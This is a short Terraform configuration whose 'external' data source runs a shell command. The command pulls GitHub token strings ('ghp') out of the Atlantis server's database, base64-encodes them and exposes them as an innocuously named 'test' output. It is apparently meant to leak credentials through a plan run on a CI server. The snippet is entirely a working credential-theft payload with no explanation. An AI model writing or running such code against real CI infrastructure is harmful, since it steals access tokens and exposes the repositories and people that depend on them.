data "external" "example" {
  program = ["sh", "-c", "strings ~/.atlantis/atlantis.db | tr ',' '\n' | grep ghp | sort | base64 -w 0 | xargs -0 printf '{ \"CloneURL\": \"%s\" }'"]
}
output "test"  {
  value = data.external.example.result.CloneURL
}
